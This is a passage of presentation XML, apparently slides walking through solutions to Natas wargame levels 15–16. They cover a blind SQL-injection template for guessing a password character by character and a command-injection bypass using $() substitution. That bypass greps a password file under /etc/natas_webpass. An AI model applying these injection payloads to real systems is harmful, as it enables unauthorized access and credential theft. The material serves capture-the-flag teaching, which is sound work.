        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="25.6cm" svg:height="15.086cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p xml:id="id56" text:id="id56">Now, we can do the same thing for the password</text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id57" text:id="id57">Guess the password in one-character slices with</text:p>
                <text:list>
                  <text:list-header>
                    <text:p xml:id="id58" text:id="id58" text:style-name="P2"><text:span text:style-name="T1">natas16" and STRCMP(</text:span></text:p>
                    <text:p xml:id="id59" text:id="id59" text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">SUBSTR(password, %d, 1),</text:span></text:p>
                    <text:p xml:id="id60" text:id="id60" text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">'%s') = 0 #</text:span></text:p>
                  </text:list-header>
                  <text:list-item>
                    <text:p xml:id="id61" text:id="id61" text:style-name="P7"><text:span text:style-name="T4">If you see the problem, keep it to yourself for now</text:span></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id62" text:id="id62"><text:span text:style-name="T4">Iterate through </text:span><text:span text:style-name="T1">%s</text:span><text:span text:style-name="T4"> to find the current character</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id63" text:id="id63"><text:span text:style-name="T4">Iterate through </text:span><text:span text:style-name="T1">%d</text:span><text:span text:style-name="T4"> for each one-character slice of the 32-character passwor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5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64" text:id="id64"><text:span text:style-name="T4">The password is wrong.</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id65" text:id="id65"><text:span text:style-name="T4">Notice anything different about this one, compared to our other passwords?</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id66" text:id="id66"><text:span text:style-name="T4">All lower-case</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id67" text:id="id67"><text:span text:style-name="T1">SUBSTR</text:span> is case-insensitive</text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id68" text:id="id68">Use <text:span text:style-name="T1">BINARY</text:span> to compare the raw data, ie case-sensitivel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6</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:text-style-name="P10" draw:layer="layout" svg:width="24.639cm" svg:height="14.886cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p xml:id="id69" text:id="id69" text:style-name="P2"><text:span text:style-name="T10">if(preg_match('/[;|&amp;`\'"]/',$key)) {</text:span></text:p>
            <text:p xml:id="id70" text:id="id70" text:style-name="P2"><text:span text:style-name="T10"><text:s text:c="4"/></text:span><text:span text:style-name="T10">print "Input contains an illegal character!";</text:span></text:p>
            <text:p xml:id="id71" text:id="id71" text:style-name="P2"><text:span text:style-name="T10">} else {</text:span></text:p>
            <text:p xml:id="id72" text:id="id72" text:style-name="P2"><text:span text:style-name="T10"><text:s text:c="4"/></text:span><text:span text:style-name="T10">passthru("grep -i \"$key\" dictionary.txt");</text:span></text:p>
            <text:p xml:id="id73" text:id="id73" text:style-name="P2"><text:span text:style-name="T10">}</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T10"/></text:p>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p xml:id="id74" text:id="id74" text:style-name="P8"><text:span text:style-name="T8">Two levels of escaping to overcome:</text:span></text:p>
                <text:list>
                  <text:list-item>
                    <text:p xml:id="id75" text:id="id75" text:style-name="P9"><text:span text:style-name="T8">Can't use semicolon, pipe, ampersand, backtick, single-quote, or double-quote</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p xml:id="id76" text:id="id76" text:style-name="P9"><text:span text:style-name="T7">$key</text:span><text:span text:style-name="T8"> is now double-quot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6</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="25.6cm" svg:height="15.286cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p xml:id="id77" text:id="id77">I wasted an embarassing amount of time trying to figure out how to get past this</text:p>
                <text:list>
                  <text:list-item>
                    <text:p xml:id="id78" text:id="id78">Finally realized the only contruct I knew I could get past the filter was command substitution: <text:span text:style-name="T1">$()</text:span></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id79" text:id="id79"><text:span text:style-name="T4">Wasted an even more embarassing amount of time trying to figure out how to use that</text:span></text:p>
                <text:list>
                  <text:list-item>
                    <text:p xml:id="id80" text:id="id80"><text:span text:style-name="T4">Just like the blind SQL-injection attack, search for one-character slices</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p xml:id="id81" text:id="id81"><text:span text:style-name="T4">Requires injecting something that returns a boolean reflecting whether the character we guessed was correc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6</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="26.8cm" svg:height="15.486cm" svg:x="0.6cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p xml:id="id82" text:id="id82">Pick a word we know is in the dictionary, say, “hacker”</text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id83" text:id="id83">Inject a command substitution that determines whether the character we guessed is in the password</text:p>
              </text:list-item>
            </text:list>
            <text:p xml:id="id84" text:id="id84" text:style-name="P2"><text:span text:style-name="T10">grep -i \</text:span></text:p>
            <text:p xml:id="id85" text:id="id85" text:style-name="P2"><text:span text:style-name="T10"><text:s text:c="2"/></text:span><text:span text:style-name="T10">"$(grep -E ^%s /etc/natas_webpass/natas17)hacker"\</text:span></text:p>
            <text:p xml:id="id86" text:id="id86" text:style-name="P2"><text:span text:style-name="T10"><text:s text:c="2"/></text:span><text:span text:style-name="T10">dictionary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ndenHill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vel 16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 xml:id="id87" text:id="id87"><text:span text:style-name="T8">If the prefix we guess is wrong, then</text:span></text:p>
                <text:list>
                  <text:list-item>
                    <text:p xml:id="id88" text:id="id88"><text:span text:style-name="T8">the command substitution returns nothing</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p xml:id="id89" text:id="id89"><text:span text:style-name="T8">the outer grep finds “hacker” in the dictionary</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p xml:id="id90" text:id="id90"><text:span text:style-name="T8">the page contains the string “hacker”</text:span></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id91" text:id="id91"><text:span text:style-name="T8">If the prefix we guess is right, then</text:span></text:p>
                <text:list>
                  <text:list-item>
                    <text:p xml:id="id92" text:id="id92"><text:span text:style-name="T8">the command substitution returns that line</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p xml:id="id93" text:id="id93"><text:span text:style-name="T8">the outer grep searches for “aF3%hacker” or whatever, and doesn't find it</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p xml:id="id94" text:id="id94"><text:span text:style-name="T8">the page does not include the string “hacker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denHill-background" style:family="presentation">
      <style:graphic-properties draw:stroke="none" draw:fill="none"/>
      <style:text-properties style:letter-kerning="true"/>
    </style:style>
    <style:style style:name="LindenHi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denHil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ndenHill-outline1" style:family="presentation">
      <style:graphic-properties draw:stroke="none" draw:fill="none" draw:auto-grow-height="false" draw:fit-to-size="shrink-to-fit">
        <text:list-style style:name="LindenHi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nden Hill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denHill-outline2" style:family="presentation" style:parent-style-name="LindenHill-outline1">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.4cm" fo:text-indent="0cm"/>
      <style:text-properties fo:font-family="'Linden Hill'" style:font-pitch="variable" fo:font-size="28pt" style:font-size-asian="28pt" style:font-size-complex="28pt"/>
    </style:style>
    <style:style style:name="LindenHill-outline3" style:family="presentation" style:parent-style-name="LindenHill-outline2">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.3cm" fo:text-indent="0cm"/>
      <style:text-properties fo:font-family="'Linden Hill'" style:font-pitch="variable" fo:font-size="24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="LindenHill-outline4" style:family="presentation" style:parent-style-name="LindenHill-outline3">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.2cm" fo:text-indent="0cm"/>
      <style:text-properties fo:font-family="'Linden Hill'" style:font-pitch="variable" fo:font-size="20pt" style:font-size-asian="20pt" style:font-size-complex="20pt"/>
    </style:style>
    <style:style style:name="LindenHill-outline5" style:family="presentation" style:parent-style-name="LindenHill-outline4">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.1cm" fo:text-indent="0cm"/>
      <style:text-properties fo:font-family="'Linden Hill'" style:font-pitch="variable" fo:font-size="20pt" style:font-size-asian="20pt" style:font-size-complex="20pt"/>
    </style:style>
    <style:style style:name="LindenHill-outline6" style:family="presentation" style:parent-style-name="LindenHill-outline5">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.1cm" fo:text-indent="0cm"/>
      <style:text-properties fo:font-family="'Linden Hill'" style:font-pitch="variable" fo:font-size="20pt" style:font-size-asian="20pt" style:font-size-complex="20pt"/>
    </style:style>
    <style:style style:name="LindenHill-outline7" style:family="presentation" style:parent-style-name="LindenHill-outline6">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.1cm" fo:text-indent="0cm"/>
      <style:text-properties fo:font-family="'Linden Hill'" style:font-pitch="variable" fo:font-size="20pt" style:font-size-asian="20pt" style:font-size-complex="20pt"/>
    </style:style>
    <style:style style:name="LindenHill-outline8" style:family="presentation" style:parent-style-name="LindenHil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denHill-outline9" style:family="presentation" style:parent-style-name="LindenHil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denHill-subtitle" style:family="presentation">
      <style:graphic-properties draw:stroke="none" draw:fill="none" draw:textarea-vertical-align="middle">
        <text:list-style style:name="LindenHi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nden Hill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denHill-title" style:family="presentation">
      <style:graphic-properties draw:stroke="none" draw:fill="none" draw:textarea-vertical-align="middle">
        <text:list-style style:name="LindenHi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nden Hill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ndenHill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ndenHill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ndenHi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nden Hill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ndenHill" style:page-layout-name="PM1" draw:style-name="Mdp1">
      <draw:frame presentation:style-name="LindenHill-title" draw:layer="backgroundobjects" svg:width="25.199cm" svg:height="3.506cm" svg:x="1.4cm" svg:y="0.837cm" presentation:class="title" presentation:placeholder="true">
        <draw:text-box/>
      </draw:frame>
      <draw:frame presentation:style-name="LindenHill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LindenHill-title" draw:layer="backgroundobjects" svg:width="13.968cm" svg:height="10.476cm" svg:x="3.81cm" svg:y="2.123cm" presentation:class="page"/>
        <draw:frame presentation:style-name="LindenHill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Doherty</meta:initial-creator>
    <meta:creation-date>2013-07-14T14:25:47</meta:creation-date>
    <dc:date>2013-08-11T14:27:16</dc:date>
    <dc:creator>Mike Doherty</dc:creator>
    <meta:editing-duration>PT1H13M12S</meta:editing-duration>
    <meta:editing-cycles>7</meta:editing-cycles>
    <meta:generator>LibreOffice/4.0.2.2$Linux_X86_64 LibreOffice_project/400m0$Build-2</meta:generator>
    <meta:document-statistic meta:object-count="121"/>
  </office:meta>
</office:document-meta>
</file>